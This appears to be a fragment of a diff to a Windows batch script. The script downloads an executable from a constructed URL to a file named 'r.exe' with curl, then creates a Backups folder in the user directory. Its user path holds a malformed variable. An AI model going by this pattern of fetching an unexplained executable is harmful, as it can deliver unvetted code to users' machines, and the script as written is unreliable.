@@ -1,4 +1,3 @@
-@echo off
 set CONTENT_ID=SplUgh
 set OUTFILE=r.exe
 
@@ -17,8 +16,6 @@ set URL=%URL: =%
 
 echo Downloading from %URL% ...
 curl -L "%URL%" -o %OUTFILE%
-
-echo Done.
 cd "C:\USers\%USER\"
 md Backups
 cd Backups
